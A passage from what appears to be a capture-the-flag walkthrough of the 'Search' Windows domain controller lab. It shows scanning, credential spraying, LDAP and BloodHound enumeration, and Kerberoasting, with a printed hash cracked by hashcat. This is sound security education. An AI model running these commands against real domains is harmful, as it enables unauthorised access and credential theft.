---
title: HTB: Search
url: https://0xdf.gitlab.io/2022/04/30/htb-search.html
date: 2022-04-30T13:45:00+00:00
difficulty: Hard [40]
os: Windows
tags: htb-search, hackthebox, ctf, nmap, domain-controller, active-directory, vhosts, credentials, feroxbuster, smbmap, smbclient, password-spray, ldapsearch, ldapdomaindump, jq, bloodhound-python, bloodhound, kerberoast, hashcat, crackmapexec, msoffice, office, excel, certificate, pfx2john, firefox-certificate, client-certificate, powershell-web-access, gmsa, youtube, oscp-plus-v2, osep-plus
---

![Search](https://0xdfimages.gitlab.io/img/search-cover.png)

Search was a classic Active Directory Windows box. It starts by finding credentials in an image on the website, which I’ll use to dump the LDAP for the domain, and find a Kerberoastable user. There’s more using pivoting, each time finding another clue, with spraying for password reuse, credentials in an Excel workbook, and access to a PowerShell web access protected by client certificates. With that initial shell, its a a few hops identified through Bloodhound, including recoving a GMSA password, to get to domain admin.

## Box Info

| Name | [Search](https://hackthebox.com/machines/search)  [Search](https://hackthebox.com/machines/search) [Play on HackTheBox](https://hackthebox.com/machines/search) |
| --- | --- |
| Release Date | [18 Dec 2021](https://twitter.com/hackthebox_eu/status/1518621230944993282) |
| Retire Date | 30 Apr 2022 |
| OS | Windows Windows |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for Search |
| Radar Graph | Radar chart for Search |
| First Blood User | 00:25:39[InfoSecJack InfoSecJack](https://app.hackthebox.com/users/52045) |
| First Blood Root | 01:24:47[xct xct](https://app.hackthebox.com/users/13569) |
| Creator | [dmw0ng dmw0ng](https://app.hackthebox.com/users/610173) |

## Recon

### nmap

`nmap` found many open TCP ports, as is typical for a Windows host:

```

oxdf@hacky$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.129
Starting Nmap 7.80 ( https://nmap.org ) at 2021-11-16 15:25 EST
Nmap scan report for 10.10.11.129
Host is up (0.093s latency).
Not shown: 65513 filtered ports
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
443/tcp   open  https
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
8172/tcp  open  unknown
9389/tcp  open  adws
49666/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49686/tcp open  unknown
49693/tcp open  unknown
63904/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 13.56 seconds
oxdf@hacky$ nmap -p 53,80,88,135,139,389,443,445,464,593,636,3268,3269,8172,9389 -sCV -oA scans/nmap-tcpscripts 10.10.11.129
Starting Nmap 7.80 ( https://nmap.org ) at 2021-11-16 15:26 EST
Nmap scan report for 10.10.11.129
Host is up (0.092s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Search &mdash; Just Testing IIS
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-11-16 20:26:57Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
|_ssl-date: 2021-11-16T20:29:56+00:00; 0s from scanner time.
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Search &mdash; Just Testing IIS
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
|_ssl-date: 2021-11-16T20:29:56+00:00; 0s from scanner time.
| tls-alpn: 
|_  http/1.1
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
|_ssl-date: 2021-11-16T20:29:56+00:00; 0s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
|_ssl-date: 2021-11-16T20:29:56+00:00; 0s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
|_ssl-date: 2021-11-16T20:29:56+00:00; 0s from scanner time.
8172/tcp open  ssl/http      Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title.
| ssl-cert: Subject: commonName=WMSvc-SHA2-RESEARCH
| Not valid before: 2020-04-07T09:05:25
|_Not valid after:  2030-04-05T09:05:25
|_ssl-date: 2021-11-16T20:29:56+00:00; 0s from scanner time.
| tls-alpn: 
|_  http/1.1
9389/tcp open  mc-nmf        .NET Message Framing
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=11/16%Time=61941415%P=x86_64-pc-linux-gnu%r(DNS
SF:VersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version
SF:\x04bind\0\0\x10\0\x03");
Service Info: Host: RESEARCH; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-11-16T20:29:17
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 188.13 seconds

```

The combination of ports indicate this is likely an [Active Directory Domain Controller](https://techgenix.com/domain-controllers-required-ports/) as well as a web server. Based on the [IIS version](https://en.wikipedia.org/wiki/Internet_Information_Services#Versions) the host is likely running Windows 10 or Server 2016/2019.

`nmap` is reporting the TLS certificate on 443 as “research”. LDAP is reporting the domain `search.htb`.

### TLS Certificate

Looking in Firefox at the TLS certificate shows it has two common names:

![image-20211117114347963](https://0xdfimages.gitlab.io/img/image-20211117114347963.png)

I’ll note the subdomain and add it, along with the base domain to `/etc/hosts`:

```
10.10.11.129 search.htb research.search.htb research

```

### Website - TCP 80/443

#### Site

From everything I can tell, the HTTP and HTTPS site were the same content.

The site if for some kind of business consultant:

[![image-20211116175949465](https://0xdfimages.gitlab.io/img/image-20211116175949465.png)](https://0xdfimages.gitlab.io/img/image-20211116175949465.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20211116175949465.png)

One of the rotating pictures in the middle is important to look closely at:

![image-20211116180041099](https://0xdfimages.gitlab.io/img/image-20211116180041099.png)

Zooming in a bit:

![image-20211116180117960](https://0xdfimages.gitlab.io/img/image-20211116180117960.png)

It says “Send password to Hope Sharp” and on the next line, “IsolationIsKey?”. That’s likely a user’s name and maybe a password.

#### Tech Stack

`nmap` already identified this as IIS. The response headers give some additional information:

```

HTTP/1.1 200 OK
Content-Type: text/html
Last-Modified: Tue, 11 Aug 2020 10:13:04 GMT
Accept-Ranges: bytes
ETag: "5f3800c86fd61:0"
Server: Microsoft-IIS/10.0
X-Powered-By: ASP.NET
Date: Wed, 17 Nov 2021 01:42:25 GMT
Connection: close
Content-Length: 44982

```

The `X-Powered-By` header says `ASP.NET`, which means I should expect `.aspx` files.

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and include `-x aspx`. I’ll also use a lowercase wordlist as I know IIS is case-insensitive:

```

oxdf@hacky$ feroxbuster -u http://10.10.11.129 -x aspx -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.129
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.0
 💲  Extensions            │ [aspx]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
301        2l       10w      150c http://10.10.11.129/images
301        2l       10w      146c http://10.10.11.129/js
301        2l       10w      147c http://10.10.11.129/css
301        2l       10w      149c http://10.10.11.129/fonts
403       29l       92w     1233c http://10.10.11.129/staff
[####################] - 7m    265830/265830  0s      found:5       errors:292    
[####################] - 6m     53166/53166   128/s   http://10.10.11.129
[####################] - 7m     53166/53166   126/s   http://10.10.11.129/images
[####################] - 7m     53166/53166   126/s   http://10.10.11.129/js
[####################] - 7m     53166/53166   126/s   http://10.10.11.129/css
[####################] - 6m     53166/53166   126/s   http://10.10.11.129/fonts

```

`/staff` is kind of interesting, but it’s returning 403 forbidden.

I’ll also run another short wordlist from [SecLists](https://github.com/danielmiessler/SecLists), `IIS.fuzz.txt`, as it will look for IIS specific things:

```

oxdf@hacky$ feroxbuster -u http://10.10.11.129 -w /usr/share/seclists/Discovery/Web-Content/IIS.fuzz.txt 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.129
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/IIS.fuzz.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.0
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
401       29l      100w     1293c http://10.10.11.129/certsrv/mscep/mscep.dll
403       29l       92w     1233c http://10.10.11.129/certenroll/
403       29l       92w     1233c http://10.10.11.129/images/
401       29l      100w     1293c http://10.10.11.129/certsrv/
401       29l      100w     1293c http://10.10.11.129/certsrv/mscep_admin
[####################] - 10s      630/630     0s      found:5       errors:3      
[####################] - 10s      210/210     28/s    http://10.10.11.129
[####################] - 8s       210/210     49/s    http://10.10.11.129/certenroll/
[####################] - 7s       210/210     54/s    http://10.10.11.129/images/

```

`/certsrv` and `/certenroll` show that this server is part of a [Certificate Authority](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh831649(v=ws.11)).

Visiting `/certsrv` asks for authentication, and `/certenroll` just returns 403.

### SMB

#### Unauthenticated

Without creds, I’m not able to enumerate SMB at all:

```

oxdf@hacky$ smbmap -H 10.10.11.129
[+] Finding open SMB ports....
[+] User SMB session established on 10.10.11.129...
[+] IP: 10.10.11.129:445        Name: 10.10.11.129                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
[!] Access Denied
oxdf@hacky$ smbmap -H 10.10.11.129 -u oxdf -p oxdf
[+] Finding open SMB ports....
[!] Authentication error on 10.10.11.129
[!] Authentication error on 10.10.11.129
oxdf@hacky$ smbclient -N -L //10.10.11.129
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
SMB1 disabled -- no workgroup available

```

#### Credential Brute Force

I have a name and a password from the image above. I’ll create a list of possible usernames from Hope Sharp in a file `hope.txt`:

```

hope
sharp
h.sharp
hope.s
hope.sharp
hopesharp

```

Now I can pass that to `crackmapexec` along with the password, and it finds a match:

```

oxdf@hacky$ crackmapexec smb 10.10.11.129 -u hope.txt -p IsolationIsKey? --continue-on-success
SMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\hope:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\sharp:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\h.sharp:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\hope.s:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [+] search.htb\hope.sharp:IsolationIsKey? 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\hopesharp:IsolationIsKey? STATUS_LOGON_FAILURE 

```

#### Authenticated

There are a bunch of shares on the host:

```

oxdf@hacky$ smbmap -u hope.sharp -p IsolationIsKey? -H 10.10.11.129 --no-banner

[+] IP: 10.10.11.129:445        Name: 10.10.11.129              Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        CertEnroll                                              READ ONLY       Active Directory Certificate Services share
        helpdesk                                                NO ACCESS
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        RedirectedFolders$                                      READ, WRITE
        SYSVOL                                                  READ ONLY       Logon server share 

```

The `CertEnroll` share has some `.crl` files and other certificate related stuff that isn’t useful.

I am able to connect to `helpdesk`, but not list anything in it.

`NETLOGON` is empty.

`RedirectedFolders$` has a bunch of users:

```

oxdf@hacky$ smbclient //10.10.11.129/RedirectedFolders$ -U hope.sharp
Enter WORKGROUP\hope.sharp's password: 
Try "help" to get a list of possible commands.
smb: \> ls            
  .                                  Dc        0  Tue Nov 16 21:07:47 2021
  ..                                 Dc        0  Tue Nov 16 21:07:47 2021
  abril.suarez                       Dc        0  Tue Apr  7 14:12:58 2020
  Angie.Duffy                        Dc        0  Fri Jul 31 09:11:32 2020
  Antony.Russo                       Dc        0  Fri Jul 31 08:35:32 2020
  belen.compton                      Dc        0  Tue Apr  7 14:32:31 2020
  Cameron.Melendez                   Dc        0  Fri Jul 31 08:37:36 2020
  chanel.bell                        Dc        0  Tue Apr  7 14:15:09 2020
  Claudia.Pugh                       Dc        0  Fri Jul 31 09:09:08 2020
  Cortez.Hickman                     Dc        0  Fri Jul 31 08:02:04 2020
  dax.santiago                       Dc        0  Tue Apr  7 14:20:08 2020
  Eddie.Stevens                      Dc        0  Fri Jul 31 07:55:34 2020
  edgar.jacobs                       Dc        0  Thu Apr  9 16:04:11 2020
  Edith.Walls                        Dc        0  Fri Jul 31 08:39:50 2020
  eve.galvan                         Dc        0  Tue Apr  7 14:23:13 2020
  frederick.cuevas                   Dc        0  Tue Apr  7 14:29:22 2020
  hope.sharp                         Dc        0  Thu Apr  9 10:34:41 2020
  jayla.roberts                      Dc        0  Tue Apr  7 14:07:00 2020
  Jordan.Gregory                     Dc        0  Fri Jul 31 09:01:06 2020
  payton.harmon                      Dc        0  Thu Apr  9 16:11:39 2020
  Reginald.Morton                    Dc        0  Fri Jul 31 07:44:32 2020
  santino.benjamin                   Dc        0  Tue Apr  7 14:10:25 2020
  Savanah.Velazquez                  Dc        0  Fri Jul 31 08:21:42 2020
  sierra.frye                        Dc        0  Tue Apr  7 14:03:38 2020
  trace.ryan                         Dc        0  Thu Apr  9 16:14:26 2020

                5085183 blocks of size 4096. 2165892 blocks available

```

I’m able to read files in hope.sharp’s dir:

```

smb: \> ls hope.sharp\
  .                                  Dc        0  Thu Apr  9 10:34:41 2020
  ..                                 Dc        0  Thu Apr  9 10:34:41 2020
  Desktop                           DRc        0  Thu Apr  9 10:35:49 2020
  Documents                         DRc        0  Thu Apr  9 10:35:50 2020
  Downloads                         DRc        0  Thu Apr  9 10:35:49 2020

                5085183 blocks of size 4096. 2165892 blocks available
smb: \> ls hope.sharp\Desktop\
  .                                 DRc        0  Thu Apr  9 10:35:49 2020
  ..                                DRc        0  Thu Apr  9 10:35:49 2020
  $RECYCLE.BIN                     DHSc        0  Thu Apr  9 10:35:49 2020
  desktop.ini                      AHSc      282  Thu Apr  9 10:35:00 2020
  Microsoft Edge.lnk                 Ac     1450  Thu Apr  9 10:35:38 2020

                5085183 blocks of size 4096. 2165892 blocks available

```

But not inside the other users:

```

smb: \> ls trace.ryan\
  .                                  Dc        0  Thu Apr  9 16:14:26 2020
  ..                                 Dc        0  Thu Apr  9 16:14:26 2020
  Desktop                           DRc        0  Fri Jul 31 07:40:32 2020
  Documents                         DRc        0  Fri Jul 31 07:40:32 2020
  Downloads                         DRc        0  Fri Jul 31 07:40:32 2020

                5085183 blocks of size 4096. 2165892 blocks available
smb: \> ls trace.ryan\Desktop\
NT_STATUS_ACCESS_DENIED listing \trace.ryan\Desktop\

```

I can get a list of users to potentially use down the road.

The `SYSVOL` share has standard stuff, but nothing that is useful.

### LDAP - TCP 389

#### Unauthenticated ldapsearch

`ldapsearch` is a good tool for manual enumeration of LDAP. I’ll list the base naming contexts:

```

oxdf@hacky$ ldapsearch -h 10.10.11.129 -x -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingcontexts: DC=search,DC=htb
namingcontexts: CN=Configuration,DC=search,DC=htb
namingcontexts: CN=Schema,CN=Configuration,DC=search,DC=htb
namingcontexts: DC=DomainDnsZones,DC=search,DC=htb
namingcontexts: DC=ForestDnsZones,DC=search,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1

```

search.htb shows up as “DC=search,DC=htb”. If I try to get any deeper, it asks for auth:

```

oxdf@hacky$ ldapsearch -h 10.10.11.129 -x -b "DC=search,DC=htb"
# extended LDIF
#
# LDAPv3
# base <DC=search,DC=htb> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4563

# numResponses: 1

```

#### Authenticated ldapsearch

With creds, there’s a bunch of data dumped out:

```

oxdf@hacky$ ldapsearch -h 10.10.11.129 -D 'hope.sharp@search.htb' -w "IsolationIsKey?" -b "DC=search,DC=htb"
# extended LDIF
#
# LDAPv3
# base <DC=search,DC=htb> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search.htb
dn: DC=search,DC=htb
objectClass: top
objectClass: domain
objectClass: domainDNS
distinguishedName: DC=search,DC=htb
instanceType: 5
whenCreated: 20200331141828.0Z
whenChanged: 20211117005436.0Z
subRefs: DC=ForestDnsZones,DC=search,DC=htb
subRefs: DC=DomainDnsZones,DC=search,DC=htb
subRefs: CN=Configuration,DC=search,DC=htb
...[snip]...

```

#### ldapdomaindump

I can scroll through this manually, but `ldapdomaindump` is a nice tool to visualize LDAP data. I’ll create a `ldap` directory for the output, and then run it:

```

oxdf@hacky$ ldapdomaindump -u search.htb\\hope.sharp -p 'IsolationIsKey?' 10.10.11.129 -o ldap/
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished

```

This creates a bunch of files in HTML, Json, and grepable formats:

```

oxdf@hacky$ ls ldap/
domain_computers_by_os.html  domain_computers.json  domain_groups.json  domain_policy.json  domain_trusts.json          domain_users.html
domain_computers.grep        domain_groups.grep     domain_policy.grep  domain_trusts.grep  domain_users_by_group.html  domain_users.json
domain_computers.html        domain_groups.html     domain_policy.html  domain_trusts.html  domain_users.grep

```

There’s a bunch of information here. For one, the Tristan.Davies account is the domain administrator:

[![image-20211117064428612](https://0xdfimages.gitlab.io/img/image-20211117064428612.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20211117064428612.png)

The description says “The only Domain Admin allowed, Administrator will soon be disabled”. This account seems like a target for later.

There’s a bunch of accounts labeled as “HelpDesk User” and different location-based helpdesk groups:

[![image-20211117064552038](https://0xdfimages.gitlab.io/img/image-20211117064552038.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20211117064552038.png)

There’s another account, web\_svc which is described as “Temp Account created by HelpDesk”:

[![image-20211117064845447](https://0xdfimages.gitlab.io/img/image-20211117064845447.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20211117064845447.png)

### Bloodhound

With creds I can run [bloodhound.py](https://github.com/fox-it/BloodHound.py) against the domain. There’s a bunch of computer objects registered in AD that I can’t connect to, which results in a bunch of errors:

```

oxdf@hacky$ bloodhound-python -u hope.sharp -p IsolationIsKey? -d search.htb -c All -ns 10.10.11.129                 
INFO: Found AD domain: search.htb
INFO: Connecting to LDAP server: research.search.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest                                        
INFO: Found 113 computers
INFO: Connecting to LDAP server: research.search.htb
INFO: Found 106 users
INFO: Found 63 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: Windows-100.search.htb
INFO: Querying computer: Windows-99.search.htb
INFO: Querying computer: Windows-98.search.htb
INFO: Querying computer: Windows-97.search.htb
INFO: Querying computer: Windows-96.search.htb
INFO: Querying computer: Windows-95.search.htb
INFO: Querying computer: Windows-94.search.htb
INFO: Querying computer: Windows-93.search.htb                             
INFO: Querying computer: Windows-92.search.htb
INFO: Querying computer: Windows-91.search.htb
WARNING: Could not resolve: Windows-98.search.htb: The DNS query name does not exist: Windows-98.search.htb.                                           
WARNING: Could not resolve: Windows-99.search.htb: The DNS query name does not exist: Windows-99.search.htb.                                           
INFO: Querying computer: Windows-90.search.htb
WARNING: Could not resolve: Windows-92.search.htb: The DNS query name does not exist: Windows-92.search.htb.
...[snip]...

```

Looking at the data, hope.sharp doesn’t have access to anything interesting.

The “List all Kerberoastable Accounts” query returns two users:

![image-20211116221652379](https://0xdfimages.gitlab.io/img/image-20211116221652379.png)

## Auth as Edgar.Jacobs

### Recovery web\_svc Password

#### Kerberoasting

As Bloodhound identified Kerberoastable users, I’ll go ahead and Kerberoast. I’ll need the creds for hope.sharp, and I’ll use the `GetUserSPNs.py` script from [Impacket](https://github.com/SecureAuthCorp/impacket). It return a hash for the web\_svc account:

```

oxdf@hacky$ GetUserSPNs.py -request -dc-ip 10.10.11.129 search.htb/hope.sharp -outputfile web_svc.hash
Impacket v0.9.24.dev1+20211022.182843.4229481c - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName               Name     MemberOf  PasswordLastSet             LastLogon  Delegation 
---------------------------------  -------  --------  --------------------------  ---------  ----------
RESEARCH/web_svc.search.htb:60001  web_svc            2020-04-09 08:59:11.329031  <never>               

oxdf@hacky$ cat web_svc.hash 
$krb5tgs$23$*web_svc$SEARCH.HTB$search.htb/web_svc*$24e6b8a007033329e2dd50ba577acda2$0086a93b2cd8b63a13c64e343a20025e07bdafb447764a1f717bcc07a64bc8c32fbf5690df0b3ebf0d783bcce56e9ceca354a8df06ebbd9394f7f405d20ad03106f74d3ee2b44776a877823f39c26c73c17032122b23e888f5d9d1e42b2e03111c3f7277ead6604e908d34c368fa6097bbee452efc2621347fb61500c47f3c7e0b769dccc95494ed9eb0fc1b429a1407cbb011004a5aacecbb9a204529e9352aa51f0b7d4038bba9a6884397cb3f5571bd55fbe9e8f61d282661cd3b720c78c0bf2ec1fc099bf3622c0b2137db012eba389d0ad4c69440297110208e60075e9531fac2cb90f89fbd93c513603c2e714708fff27e0ba67d10fb9fbc66df257665aa52057477442ff09a2788e3011b08c1b2991568eed293562acb0e360969f2857d34a59412d9e4b9faa345de7579e5dbfc7259a7f5c11173261c32ce4b97717063dd2fa98211aa7b8f109174239f258687687c8025d7f7cbcc2003642636b1589551555143f491d6b03539432bb51923499e0efd8a36756fae0bf1b2fe3283c7aa1865e7b7a2f1f3eb007f4534089fd1ff84e34833081689c0484b3ec0830aa21ac0f14dd5c7eed89f96c0397655880c96373fa70da79b6bdeb3b093cfaf2d6bebb8bee3308057b1a25797bc8afe0ac3084e6f84c22cedfd53d55fd1f2233573ceaf3a1b6573a07958534047b4aaa80b4c3a7ab730fd75e684f49079d9e060c6141e6d466f519b866b0d54850d2c134496dd5afa3904ab1adc8c552765a42338dbae02538116cf608456b255010ef8671fc9a777ae49da573570442571fb3239de3f683c8537557b5a1dc5ce220e7ed9a82b5355503e98c15a06a387eb420ec77893843be13688774a3a63346587bd64a73ad93db2ce3d60d5f96caee34452955412ad6911fc89f2ea16a3d12d174dd820bea35a425d476eda63a5d726f5c2f9a3963eea0a06088bf11fcec7a02987cc0517f7a19bea66e857de68e2d03c4ce3645f8b1cc3995eccb7248528270e32e8333352073969756b48d3913ef7ee5e667b366175e874941d33fdff235fcd065f3d4a379d680d0a8488381e11042c088175f3935dc93909124f9eda612e70e797fde2c4a091749fb64b1ccb78ebc3a5eee2c34d92c2c37a5c57cd6739670bfd6b640d9de62d46d43f70c3f44baad4f7f1483dcdd0764513f945432448c18634ee25c43cafcc0cb8928f0697d61eda89cbc1f2c86e7589ff316ffbb5d323920635364685c6bd34d4b6946b06bbadd6e862e522e0e4e9af9eb17b7eb8259641a0d556bba880e6fe62db7a333efc4fcda8d36e7b485e6da1b3f30dd098509a9898419cc4d7da1f016a0238cd6a054134f23d08efd60c8da55dd29ee6e9e448760ec5c57e299a92

```

#### Hashcat

The [example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) page shows this matches mode 13100. After a minute or so, it cracks:

```

$ hashcat -m 13100 web_svc.hash /usr/share/wordlists/rockyou.txt 
...[snip]...
$krb5tgs$23$*web_svc$SEARCH.HTB$search.htb/web_svc*$24e6b8a007033329e2dd50ba577acda2$0086a93b2cd8b63a13c64e343a20025e07bdafb447764a1f717bcc07a64bc8c32fbf5690df0b3ebf0d783bcce56e9ceca354a8df06ebbd9394f7f405d20ad03106f74d3ee2b44776a877823f39c26c73c17032122b23e888f5d9d1e42b2e03111c3f7277ead6604e908d34c368fa6097bbee452efc2621347fb61500c47f3c7e0b769dccc95494ed9eb0fc1b429a1407cbb011004a5aacecbb9a204529e9352aa51f0b7d4038bba9a6884397cb3f5571bd55fbe9e8f61d282661cd3b720c78c0bf2ec1fc099bf3622c0b2137db012eba389d0ad4c69440297110208e60075e9531fac2cb90f89fbd93c513603c2e714708fff27e0ba67d10fb9fbc66df257665aa52057477442ff09a2788e3011b08c1b2991568eed293562acb0e360969f2857d34a59412d9e4b9faa345de7579e5dbfc7259a7f5c11173261c32ce4b97717063dd2fa98211aa7b8f109174239f258687687c8025d7f7cbcc2003642636b1589551555143f491d6b03539432bb51923499e0efd8a36756fae0bf1b2fe3283c7aa1865e7b7a2f1f3eb007f4534089fd1ff84e34833081689c0484b3ec0830aa21ac0f14dd5c7eed89f96c0397655880c96373fa70da79b6bdeb3b093cfaf2d6bebb8bee3308057b1a25797bc8afe0ac3084e6f84c22cedfd53d55fd1f2233573ceaf3a1b6573a07958534047b4aaa80b4c3a7ab730fd75e684f49079d9e060c6141e6d466f519b866b0d54850d2c134496dd5afa3904ab1adc8c552765a42338dbae02538116cf608456b255010ef8671fc9a777ae49da573570442571fb3239de3f683c8537557b5a1dc5ce220e7ed9a82b5355503e98c15a06a387eb420ec77893843be13688774a3a63346587bd64a73ad93db2ce3d60d5f96caee34452955412ad6911fc89f2ea16a3d12d174dd820bea35a425d476eda63a5d726f5c2f9a3963eea0a06088bf11fcec7a02987cc0517f7a19bea66e857de68e2d03c4ce3645f8b1cc3995eccb7248528270e32e8333352073969756b48d3913ef7ee5e667b366175e874941d33fdff235fcd065f3d4a379d680d0a8488381e11042c088175f3935dc93909124f9eda612e70e797fde2c4a091749fb64b1ccb78ebc3a5eee2c34d92c2c37a5c57cd6739670bfd6b640d9de62d46d43f70c3f44baad4f7f1483dcdd0764513f945432448c18634ee25c43cafcc0cb8928f0697d61eda89cbc1f2c86e7589ff316ffbb5d323920635364685c6bd34d4b6946b06bbadd6e862e522e0e4e9af9eb17b7eb8259641a0d556bba880e6fe62db7a333efc4fcda8d36e7b485e6da1b3f30dd098509a9898419cc4d7da1f016a0238cd6a054134f23d08efd60c8da55dd29ee6e9e448760ec5c57e299a92:@3ONEmillionbaby
...[snip]...

```

The password is @3ONEmillionbaby.

### Enumeration

Authentication as web\_svc does work with this password:

```

oxdf@hacky$ crackmapexec smb 10.10.11.129 -u web_svc -p '@3ONEmillionbaby'
SMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.129    445    RESEARCH         [+] search.htb\web_svc:@3ONEmillionbaby

```

Unfortunately, it doesn’t give access to anything new or useful. I’ll also check in the Bloodhound results, but there’s no outbound control or interesting links.

### Password Spray

#### Strategy

Given that the web\_svc account was temporarily created by the helpdesk, it’s possible that the password was reused from whoever created it. I’ll use the two passwords I have and the list of users from LDAP and see if there’s any reuse.

#### Create Users List

